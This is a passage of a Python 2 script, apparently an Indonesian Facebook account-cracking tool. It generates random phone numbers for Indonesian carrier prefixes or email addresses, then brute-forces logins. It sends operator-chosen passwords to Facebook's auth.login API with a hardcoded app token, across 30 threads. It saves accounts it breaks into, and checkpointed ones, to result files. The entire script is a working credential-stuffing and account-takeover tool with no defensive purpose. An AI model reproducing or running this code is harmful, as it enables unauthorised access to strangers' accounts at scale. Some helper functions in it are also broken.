    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Email\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Email "))
    try:
        os.system("cat email/hasil.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_nomoertogel():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Phone Number\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Live/Check "))
    try:
        os.system("cat done/indo.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

############ Beda Krek Lagi Anjg! ##############


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/64.64.121.87;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)

def cp(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.2)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)


def load(word):
    lix = [
     '/', '-', '\xe2\x95\xb2', '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.1)
            sys.stdout.flush()

back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def kreknomer():
    global cpb
    global oks
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pilih Operatornya Ngab'
    print("\033[0;96m"+50*"-")
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m1\x1b[1;37m] OPERATOR Telkomsel'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m2\x1b[1;37m] OPERATOR Indosat'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m3\x1b[1;37m] OPERATOR XL'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m4\x1b[1;37m] OPERATOR Tri - 3'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m5\x1b[1;37m] OPERATOR Axis'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m0\x1b[1;37m] Kembali Ke Menu Awal'
    bii = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
    if bii == '1' or bii == '01':
        os.system('clear')
        print logo
        print("\033[0;96m"+50*"-")
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Telkomsel: 11 12 13 21 22 23 51 52'
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62811'
        print("\033[0;96m"+50*"-")
        try:
            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one'
            raw_input(' [Back]')
            menu()

    elif bii == '2' or bii == '02':
        os.system('clear')
        print logo
        print("\033[0;96m"+50*"-")
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Indosat: 14 15 16 55 56 57 58'
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62814'
        print("\033[0;96m"+50*"-")
        try:
            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one'
            raw_input(' [Back]')
            menu()

    elif bii == '3' or bii == '03':
        os.system('clear')
        print logo
        print("\033[0;96m"+50*"-")
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code XL: 17 18 19 59 77 78'
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62817'
        print("\033[0;96m"+50*"-")
        try:
            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one'
            raw_input(' [Back]')
            menu()

    elif bii == '4' or bii == '04':
        os.system('clear')
        print logo
        print("\033[0;96m"+50*"-")
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Three: 95 96 97 98 99'
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62895'
        print("\033[0;96m"+50*"-")
        try:
            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one '
            raw_input(' [Back]')
            menu()

    elif bii == '5' or bii == '05':
        os.system('clear')
        print logo
        print("\033[0;96m"+50*"-")
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Axis: 38 31 32 33'
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example Number: 62838'
        print("\033[0;96m"+50*"-")
        try:
            k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Code Number: ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one '
            raw_input(' [Back]')
            menu()

    elif bii == '0' or bii == '00':
        menu()
    else:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose the correct one '
        pilih()
    biixdpw1 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 1  : ')
    biixdpw2 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 2  : ')
    biixdpw3 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 3  : ')
    print("\033[0;96m"+50*"-")
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Your Network Dependent Process!!!'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type CTRL + Z To Stop Crack\x1b[1;37m'
    print("\033[0;96m"+50*"-")
    xxx = str(len(id))
    psb('\x1b[0;97m [\x1b[1;36m•\x1b[1;37m] Total Crack : ' + xxx)
    psb('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] START CRACK...')
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account Live/Check saved to : done/indo.txt'
    print("\033[0;96m"+50*"-")

    def main(arg):
        user = arg

        try:
            pass1 = biixdpw1
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '|' + pass1
                okb = open('done/indo.txt', 'a')
                okb.write(' [LIVE] ' + k + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(k + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '|' + pass1
                cps = open('done/indo.txt', 'a')
                cps.write(' [CHEK] ' + k + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(k + user + pass1)
            else:
                pass2 = biixdpw2
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '|' + pass2
                    okb = open('done/indo.txt', 'a')
                    okb.write(' [LIVE] ' + k + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(k + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '|' + pass2
                    cps = open('done/indo.txt', 'a')
                    cps.write(' [CHEK] ' + k + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(k + user + pass2)
                else:
                    pass3 = biixdpw3
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '|' + pass3
                        okb = open('done/indo.txt', 'a')
                        okb.write(' [LIVE] ' + k + user + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(k + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '|' + pass3
                        cps = open('done/indo.txt', 'a')
                        cps.write(' [CHEK] ' + k + user + '|' + pass3 + '\n')
                        cps.close()
                        cpb.append(k + user + pass3)
                    else:
                        pass4 = user
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '|' + pass4
                            okb = open('done/indo.txt', 'a')
                            okb.write(' [LIVE] ' + k + user + '|' + pass4 + '\n')
                            okb.close()
                            oks.append(k + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '|' + pass4
                            cps = open('done/indo.txt', 'a')
                            cps.write(' [CHEK] ' + k + user + '|' + pass4 + '\n')
                            cps.close()
                            cpb.append(k + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] CRACKER Completed ...'
    raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Press Enter Go Back To Menu \x1b[1;97m')
    menu()

############# Krek Email Kntl! #############

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, requests, mechanize

for n in range(10000):
    nm = random.randint(111, 999)
    sys.stdout = open('.txt', 'a')
    print nm
    sys.stdout.flush()
   
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

back = 0
berhasil = []
cekpoint = []
oks = []
okb = []
id = []
cpb = []
cps = []

def emaileclone():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    try:
        c = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Nama Email  :\x1b[1;92m ')
        k = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Domain Email :\x1b[1;92m ')
        pass1 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 1   : \033[1;92m')
        pass2 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 2   : \033[1;92m')
        pass3 = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password 3   : \033[1;92m')
        print("\033[0;96m"+50*"-")
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Your Network Dependent Process!!!'
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type CTRL + Z To Stop Crack\x1b[1;37m'
        print("\033[0;96m"+50*"-")
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] File Not Found'
        raw_input('\n [BACK]')
        menu()

    xxx = str(len(id))
    psb('\x1b[0;97m [\x1b[1;36m•\x1b[1;37m] Total Crack : ' + xxx)
    psb('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] START CRACK...')
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account Email saved to : email/hasil.txt'
    print("\033[0;96m"+50*"-")

    def main(arg):
        user = arg

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print ' \033[1;92m[OK] \033[1;37m' + c + user + k + '|' + pass1
                okb = open('email/hasil.txt', 'a')
                okb.write(' [OK] ' + c + user + k + '|' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print ' \033[1;93m[CP] \033[1;37m' + c + user + k + '|' + pass1
                cps = open('email/hasil.txt', 'a')
                cps.write(' [CP] ' + c + user + k + '|' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print ' \033[1;92m[OK] \033[1;37m' + c + user + k + '|' + pass2
                    okb = open('email/hasil.txt', 'a')
                    okb.write(' [OK] ' + c + user + k + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print ' \033[1;93m[CP] \033[1;37m' + c + user + k + '|' + pass2
                    cps = open('email/hasil.txt', 'a')
                    cps.write(' [CP] ' + c + user + k + '|' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print ' \033[1;92m[OK] \033[1;37m' + c + user + k + '|' + pass3
                        okb = open('email/hasil.txt', 'a')
                        okb.write(' [OK] ' + c + user + k + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print ' \033[1;93m[CP] \033[1;37m' + c + user + k + '|' + pass3
                        cps = open('email/hasil.txt', 'a')
                        cps.write(' [CP] ' + c + user + k + '|' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    
                    
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] CRACKER Completed ...'
    raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Press Enter Go Back To Menu \x1b[1;97m')
    menu()


if __name__=="__main__":
    menu()
